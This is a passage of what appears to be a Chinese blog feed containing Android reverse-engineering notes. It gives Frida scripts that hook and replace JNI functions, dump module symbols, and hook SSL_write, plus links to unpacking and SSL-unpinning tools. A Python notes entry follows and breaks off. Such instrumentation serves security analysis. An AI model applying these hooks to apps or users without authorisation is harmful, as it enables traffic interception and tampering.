<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 枚举出所有模块的所有导出符号 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EnumerateAllExports</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> modules = Process.enumerateModules();</span><br><span class="line">    <span class="comment">//print all modules</span></span><br><span class="line">    <span class="comment">//console.log(&quot;Process.enumerateModules-&gt;&quot;,JSON.stringify(modules));</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; modules.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="built_in">module</span> = modules[i];</span><br><span class="line">        <span class="keyword">var</span> module_name = modules[i].name;</span><br><span class="line">        <span class="keyword">var</span> <span class="built_in">exports</span> = <span class="built_in">module</span>.enumerateExports();</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;module.enumerateeExports&quot;</span>, <span class="built_in">JSON</span>.stringify(<span class="built_in">exports</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="遍历某模块符号-导出-导入">遍历某模块符号/导出/导入<a class="header-anchor" href="#遍历某模块符号-导出-导入"> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">look_module</span>(<span class="params">module_name</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 根据模块名称寻找地址；根据地址找到模块返回Module对象</span></span><br><span class="line">    <span class="keyword">var</span> native_lib_addr = Process.findModuleByAddress(Module.findBaseAddress(module_name));</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;native_lib_addr =&gt; &quot;</span>,<span class="built_in">JSON</span>.stringify(native_lib_addr));</span><br><span class="line">    <span class="comment">// 遍历模块的所有Symbols</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;enumerateImports=&gt;&quot;</span>,<span class="built_in">JSON</span>.stringify(native_lib_addr.enumerateSymbols()));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">look_module(<span class="string">&quot;linker64&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="JNI框架层的利用">JNI框架层的利用<a class="header-anchor" href="#JNI框架层的利用"> ¶ </a></h3>
<h4 id="JNI框架hook：">JNI框架hook：<a class="header-anchor" href="#JNI框架hook："> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* hook jni函数GetStringUTFChars */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_getStringUTFChars_func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> GetStringUTFChars_addr = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 该函数在这个so里面，遍历里面的所有符号</span></span><br><span class="line">    <span class="keyword">var</span> symbools = Process.findModuleByName(<span class="string">&quot;libart.so&quot;</span>).enumerateSymbols();</span><br><span class="line">    <span class="comment">//console.log(JSON.stringify(symbool));</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbools.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 取到符号的name</span></span><br><span class="line">        <span class="keyword">var</span> symbol = symbools[i].name;</span><br><span class="line">        <span class="comment">// 过滤一下，因为还有一个checkjni类中有该函数</span></span><br><span class="line">        <span class="keyword">if</span> (symbol.indexOf(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span> &amp;&amp; symbol.indexOf(<span class="string">&quot;JNI&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (symbol.indexOf(<span class="string">&quot;GetStringUTFChars&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;finally found GetStringUTFChars name:&quot;</span>, symbol);</span><br><span class="line">                <span class="comment">// 保存该函数的地址</span></span><br><span class="line">                GetStringUTFChars_addr = symbools[i].address;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;finally found GetStringUTFChars address :&quot;</span>, GetStringUTFChars_addr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 开始附加该函数 */</span></span><br><span class="line">    Interceptor.attach(GetStringUTFChars_addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;art::JNI::GetStringUTFChars(_JNIEnv*,_jstring*,unsigned char*)-&gt;&quot;</span>, args[<span class="number">0</span>], Java.vm.getEnv().getStringUtfChars(args[<span class="number">1</span>], <span class="literal">null</span>).readCString(), args[<span class="number">2</span>]);</span><br><span class="line">            <span class="comment">// 打印栈回溯</span></span><br><span class="line">            <span class="comment">// console.log(&quot;CCCryptoCreate called from:\n&quot; + Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join(&quot;\n&quot;) + &quot;\n&quot;);</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 打印返回值，为c字符串</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;retval is-&gt;&quot;</span>, retval.readCString());</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="JNI框架replace：">JNI框架replace：<a class="header-anchor" href="#JNI框架replace："> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 对NewStringUTF函数进行replace操作 */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace_NewStringUTF_func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* 同上 */</span></span><br><span class="line">    <span class="keyword">var</span> NewStringUTF_addr = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 该函数在这个so里面，遍历里面的所有符号</span></span><br><span class="line">    <span class="keyword">var</span> symbools = Process.findModuleByName(<span class="string">&quot;libart.so&quot;</span>).enumerateSymbols();</span><br><span class="line">    <span class="comment">//console.log(JSON.stringify(symbool));</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbools.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 取到符号的name</span></span><br><span class="line">        <span class="keyword">var</span> symbol = symbools[i].name;</span><br><span class="line">        <span class="comment">// 过滤一下，因为还有一个checkjni类中有该函数</span></span><br><span class="line">        <span class="keyword">if</span> (symbol.indexOf(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span> &amp;&amp; symbol.indexOf(<span class="string">&quot;JNI&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (symbol.indexOf(<span class="string">&quot;NewStringUTF&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;finally found NewStringUTF_name:&quot;</span>, symbol);</span><br><span class="line">                <span class="comment">// 保存该函数的地址</span></span><br><span class="line">                NewStringUTF_addr = symbools[i].address;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;finally found NewStringUTF_address :&quot;</span>, NewStringUTF_addr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new一个NewStringUTF的NativeFunction</span></span><br><span class="line">    <span class="comment">/* static jstring NewStringUTF(JNIEnv* env, const char* utf) */</span></span><br><span class="line">    <span class="keyword">var</span> NewStringUTF = <span class="keyword">new</span> NativeFunction(NewStringUTF_addr, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">    <span class="comment">// 然后执行替换</span></span><br><span class="line">    Interceptor.replace(</span><br><span class="line">        NewStringUTF_addr,</span><br><span class="line">        <span class="keyword">new</span> NativeCallback(</span><br><span class="line">            <span class="function"><span class="keyword">function</span> (<span class="params">arg1, arg2</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// 打印原本的参数</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;NewStringUTF arg1,arg2-&gt;&quot;</span>, arg1, arg2.readCString());</span><br><span class="line">                <span class="comment">// new一个char*字符串</span></span><br><span class="line">                <span class="keyword">var</span> newARG2 = Memory.allocUtf8String(<span class="string">&quot;newPARG2&quot;</span>);</span><br><span class="line">                <span class="comment">/* 将参数替换，然后执行原函数并返回结果</span></span><br><span class="line"><span class="comment">        var result=NewStringUTF(arg1,newARG2); // 不能随意修改，会导致崩溃*/</span></span><br><span class="line">                <span class="keyword">var</span> result = NewStringUTF(arg1, arg2);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;pointer&quot;</span>,</span><br><span class="line">            [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="native层代码模板复用">native层代码模板复用<a class="header-anchor" href="#native层代码模板复用"> ¶ </a></h2>
<h3 id="Frida写文件">Frida写文件<a class="header-anchor" href="#Frida写文件"> ¶ </a></h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;*&#125;</span> </span>path 写文件的路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;*&#125;</span> </span>contents 写文件的内容</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeSomething</span>(<span class="params">path, contents</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> fopen_addr = Module.findExportByName(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> fputs_addr = Module.findExportByName(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fputs&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> fclose_addr = Module.findExportByName(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fclose&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//console.log(&quot;fopen=&gt;&quot;,fopen_addr,&quot;  fputs=&gt;&quot;,fputs_addr,&quot;  fclose=&gt;&quot;,fclose_addr);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> fopen = <span class="keyword">new</span> NativeFunction(fopen_addr, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">    <span class="keyword">var</span> fputs = <span class="keyword">new</span> NativeFunction(fputs_addr, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">    <span class="keyword">var</span> fclose = <span class="keyword">new</span> NativeFunction(fclose_addr, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//console.log(path,contents)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> fileName = Memory.allocUtf8String(path);</span><br><span class="line">    <span class="keyword">var</span> mode = Memory.allocUtf8String(<span class="string">&quot;a+&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> fp = fopen(fileName, mode);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> contentHello = Memory.allocUtf8String(contents);</span><br><span class="line">    <span class="keyword">var</span> ret = fputs(contentHello, fp);</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="遍历module的导出表与符号表">遍历module的导出表与符号表<a class="header-anchor" href="#遍历module的导出表与符号表"> ¶ </a></h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 遍历导出表与符号表 Example</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;*&#125;</span> </span>path 写文件的路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;*&#125;</span> </span>contents 写文件的内容</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeSomething</span>(<span class="params">path, contents</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> fopen_addr = Module.findExportByName(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> fputs_addr = Module.findExportByName(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fputs&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> fclose_addr = Module.findExportByName(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fclose&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//console.log(&quot;fopen=&gt;&quot;,fopen_addr,&quot;  fputs=&gt;&quot;,fputs_addr,&quot;  fclose=&gt;&quot;,fclose_addr);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> fopen = <span class="keyword">new</span> NativeFunction(fopen_addr, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">    <span class="keyword">var</span> fputs = <span class="keyword">new</span> NativeFunction(fputs_addr, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">    <span class="keyword">var</span> fclose = <span class="keyword">new</span> NativeFunction(fclose_addr, <span class="string">&quot;int&quot;</span>, [<span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//console.log(path,contents)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> fileName = Memory.allocUtf8String(path);</span><br><span class="line">    <span class="keyword">var</span> mode = Memory.allocUtf8String(<span class="string">&quot;a+&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> fp = fopen(fileName, mode);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> contentHello = Memory.allocUtf8String(contents);</span><br><span class="line">    <span class="keyword">var</span> ret = fputs(contentHello, fp);</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 对指定函数进行attachHOOK **/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attach</span>(<span class="params">name, address</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;attaching &quot;</span>, name);</span><br><span class="line">    Interceptor.attach(address, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;Entering =&gt; &quot;</span>, name);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//console.log(&quot;retval is =&gt; &quot;,retval)</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app_packagename = <span class="string">&quot;com.forgotten.learntest&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 遍历moudles的exports */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">traceNativeExport</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> modules = Process.enumerateModules();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; modules.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="built_in">module</span> = modules[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">module</span>.name.indexOf(<span class="string">&quot;libssl.so&quot;</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> path = <span class="string">&quot;/data/data/&quot;</span> + app_packagename + <span class="string">&quot;/cache/&quot;</span> + <span class="built_in">module</span>.name + <span class="string">&quot;_exports.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="built_in">exports</span> = <span class="built_in">module</span>.enumerateExports();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="built_in">exports</span>.length; j++) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;module name is =&gt;&quot;</span>, <span class="built_in">module</span>.name, <span class="string">&quot; symbol name is =&gt;&quot;</span>, <span class="built_in">exports</span>[j].name);</span><br><span class="line"></span><br><span class="line">            writeSomething(path, <span class="string">&quot;type: &quot;</span> + <span class="built_in">exports</span>[j].type + <span class="string">&quot; function name :&quot;</span> + <span class="built_in">exports</span>[j].name + <span class="string">&quot; address : &quot;</span> + <span class="built_in">exports</span>[j].address + <span class="string">&quot; offset =&gt; 0x&quot;</span> + <span class="built_in">exports</span>[j].address.sub(modules[i].base) + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">exports</span>[j].name.indexOf(<span class="string">&quot;SSL_write&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                attach(<span class="built_in">exports</span>[j].name, <span class="built_in">exports</span>[j].address);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 遍历moudles的symbols */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">traceNativeSymbol</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> modules = Process.enumerateModules();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; modules.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="built_in">module</span> = modules[i];</span><br><span class="line">        <span class="comment">// console.log(JSON.stringify(module));</span></span><br><span class="line">        <span class="comment">/*可以对指定module进行过滤*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">module</span>.name.indexOf(<span class="string">&quot;linker64&quot;</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> path = <span class="string">&quot;/data/data/&quot;</span> + app_packagename + <span class="string">&quot;/cache/&quot;</span> + <span class="built_in">module</span>.name + <span class="string">&quot;_symbols.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="built_in">exports</span> = <span class="built_in">module</span>.enumerateSymbols();</span><br><span class="line">        <span class="comment">// console.log(JSON.stringify(exports))</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="built_in">exports</span>.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">exports</span>[j] == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;module name is =&gt;&quot;</span>, <span class="built_in">module</span>.name, <span class="string">&quot; symbol name is =&gt;&quot;</span>, <span class="built_in">exports</span>[j].name);</span><br><span class="line"></span><br><span class="line">            writeSomething(path, <span class="string">&quot;type: &quot;</span> + <span class="built_in">exports</span>[j].type + <span class="string">&quot; function name :&quot;</span> + <span class="built_in">exports</span>[j].name + <span class="string">&quot; address : &quot;</span> + <span class="built_in">exports</span>[j].address + <span class="string">&quot; offset =&gt; 0x&quot;</span> + <span class="built_in">exports</span>[j].address.sub(modules[i].base) + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Entering main&quot;</span>);</span><br><span class="line">    traceNativeExport();</span><br><span class="line">    traceNativeSymbol();</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="读写-std-string">读写 std::string<a class="header-anchor" href="#读写-std-string"> ¶ </a></h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readStdString</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> isTiny = (str.readU8 &amp; <span class="number">1</span>) === <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (isTiny) &#123;</span><br><span class="line">        <span class="keyword">return</span> str.add(<span class="number">1</span>).readUtf8String();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line">        .add(<span class="number">2</span> * Process.pointerSize)</span><br><span class="line">        .readPointer()</span><br><span class="line">        .readUtf8String();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeStdString</span>(<span class="params">str, content</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> isTiny = (str.readU8() &amp; <span class="number">1</span>) === <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (isTiny) &#123;</span><br><span class="line">        str.add(<span class="number">1</span>).writeUtf8String(content);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        str.add(<span class="number">2</span> * Process.pointerSize)</span><br><span class="line">            .readPointer()</span><br><span class="line">            .writeUtf8String(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Frida打印String">Frida打印String[]<a class="header-anchor" href="#Frida打印String"> ¶ </a></h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> len = Java.vm.getEnv().getArrayLength(jstringArr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;len&quot;</span>, len);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">     <span class="keyword">var</span> obj = Java.vm.getEnv().getObjectArrayElement (jstringArr,i);</span><br><span class="line">     <span class="comment">// console.log(obj);</span></span><br><span class="line">     <span class="comment">// 方式一：</span></span><br><span class="line">     <span class="comment">// var element = Java.cast(obj, Java.use(&quot;java.lang.String&quot;));</span></span><br><span class="line">     <span class="comment">// 方式二：</span></span><br><span class="line">     <span class="keyword">var</span> element = Java.vm.getEnv().getStringUtfChars(obj, <span class="literal">null</span>).readCString();</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;个:&quot;</span>+ element)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h2 id="相关脚本使用">相关脚本使用<a class="header-anchor" href="#相关脚本使用"> ¶ </a></h2>
<h3 id="Unpackers">Unpackers<a class="header-anchor" href="#Unpackers"> ¶ </a></h3>
<h4 id="FRIDA-DEXDump-2">FRIDA-DEXDump<a class="header-anchor" href="#FRIDA-DEXDump-2"> ¶ </a></h4>
<p><a href="https://github.com/hluwa/FRIDA-DEXDump">hluwa/frida-dexdump: A frida tool to dump dex in memory to support security engineers analyzing malware. (github.com)</a></p>
<h4 id="frida-fart">frida_fart<a class="header-anchor" href="#frida-fart"> ¶ </a></h4>
<p><a href="https://github.com/hanbinglengyue/FART">hanbinglengyue/FART: ART环境下自动化脱壳方案 (github.com)</a></p>
<h4 id="frida-dump">frida_dump<a class="header-anchor" href="#frida-dump"> ¶ </a></h4>
<p><a href="https://github.com/lasting-yang/frida_dump">lasting-yang/frida_dump: frida dump dex, frida dump so (github.com)</a></p>
<h3 id="NetWork">NetWork<a class="header-anchor" href="#NetWork"> ¶ </a></h3>
<h4 id="r0capture">r0capture<a class="header-anchor" href="#r0capture"> ¶ </a></h4>
<p><a href="https://github.com/r0ysue/r0capture">r0ysue/r0capture: 安卓应用层抓包通杀脚本 (github.com)</a></p>
<h4 id="OkHttpLogger-Frida">OkHttpLogger-Frida<a class="header-anchor" href="#OkHttpLogger-Frida"> ¶ </a></h4>
<p><a href="https://github.com/siyujie/OkHttpLogger-Frida">siyujie/OkHttpLogger-Frida: Frida 实现拦截okhttp的脚本 (github.com)</a></p>
<h4 id="frida-ssl-logger">frida_ssl_logger<a class="header-anchor" href="#frida-ssl-logger"> ¶ </a></h4>
<p><a href="https://github.com/BigFaceCat2017/frida_ssl_logger">BigFaceCat2017/frida_ssl_logger: ssl_logger based on frida (github.com)</a></p>
<h4 id="okhttp-sslunpinning">okhttp-sslunpinning<a class="header-anchor" href="#okhttp-sslunpinning"> ¶ </a></h4>
<p><a href="https://github.com/bxl0608/okhttp-sslunpinning">bxl0608/okhttp-sslunpinning (github.com)</a></p>
<h3 id="Trace">Trace<a class="header-anchor" href="#Trace"> ¶ </a></h3>
<h4 id="jnitrace">jnitrace<a class="header-anchor" href="#jnitrace"> ¶ </a></h4>
<p><a href="https://github.com/chame1eon/jnitrace">chame1eon/jnitrace: A Frida based tool that traces usage of the JNI API in Android apps. (github.com)</a></p>
<h4 id="frida-hook-libart">frida_hook_libart<a class="header-anchor" href="#frida-hook-libart"> ¶ </a></h4>
<p><a href="https://github.com/lasting-yang/frida_hook_libart">lasting-yang/frida_hook_libart: Frida hook some jni functions (github.com)</a></p>
<h4 id="frida-trace">frida-trace<a class="header-anchor" href="#frida-trace"> ¶ </a></h4>
<p><a href="https://frida.re/docs/frida-trace/">frida-trace | Frida • A world-class dynamic instrumentation framework</a></p>
<h3 id="Memory">Memory<a class="header-anchor" href="#Memory"> ¶ </a></h3>
<h4 id="Wallbreaker-2">Wallbreaker<a class="header-anchor" href="#Wallbreaker-2"> ¶ </a></h4>
<p><a href="https://github.com/hluwa/Wallbreaker">hluwa/Wallbreaker: 🔨 Break Java Reverse Engineering form Memory World! (github.com)</a></p>
<h2 id="Or">Or<a class="header-anchor" href="#Or"> ¶ </a></h2>
<ul>
<li>
<p><a href="https://eternalsakura13.com/2020/07/04/frida/">Frida Android hook | Sakuraのblog (eternalsakura13.com)</a></p>
</li>
<li>
<p><a href="https://kevinspider.github.io/frida/frida-hook-java/">分类: frida | 凡墙总是门 (kevinspider.github.io)</a></p>
</li>
<li>
<p><a href="https://kevinspider.github.io/frida/frida-hook-so/">分类: frida | 凡墙总是门 (kevinspider.github.io)</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Python学习个人简记</title>
    <url>/Development/python/Python_Development_Notes/</url>
    <content><![CDATA[<h1 id="Python学习">Python学习<a class="header-anchor" href="#Python学习"> ¶ </a></h1>
<h2 id="类型">类型<a class="header-anchor" href="#类型"> ¶ </a></h2>
<h3 id="类型转换">类型转换<a class="header-anchor" href="#类型转换"> ¶ </a></h3>
<p><code>int()</code>：将…转换为整数</p>
<p><code>float()</code>：将…转换为浮点数</p>
<p><code>str()</code>：将…转换为字符串</p>
<h3 id="判断类型">判断类型<a class="header-anchor" href="#判断类型"> ¶ </a></h3>
<p>查看变量类型<code>type()</code>，传入变量会告诉类型</p>
<p>判断变量类型<code>isinstance(elem, type)</code>：判断elem是否为type类型，返回bool类型的真假</p>
<h2 id="字符串">字符串<a class="header-anchor" href="#字符串"> ¶ </a></h2>
<p>原始字符串：字符串前加一个<code>r</code>，可以不用转义</p>
<table>
<thead>
<tr>
<th style="text-align:center">方法/函数</th>
<th style="text-align:center">参数</th>
<th style="text-align:center">返回值</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">.title()</td>
<td style="text-align:center"></td>
<td style="text-align:center">新字符串</td>
<td style="text-align:center">将字符串各单词首字母改为大写</td>
</tr>
<tr>
<td style="text-align:center">.upper()</td>
<td style="text-align:center"></td>
<td style="text-align:center">新字符串</td>
<td style="text-align:center">将字符串中字母全部改为大写</td>
</tr>
<tr>
<td style="text-align:center">.lower()</td>
<td style="text-align:center"></td>
<td style="text-align:center">新字符串</td>
<td style="text-align:center">将字符串中字母全部改为小写</td>
</tr>
<tr>
<td style="text-align:center">.rstrip()</td>
<td style="text-align:center"></td>
<td style="text-align:center">新字符串</td>
<td style="text-align:center">将字符串右侧空白删除</td>
</tr>
<tr>
<td style="text-align:center">.lstrip()</td>
<td style="text-align:center"></td>
<td style="text-align:center">新字符串</td>
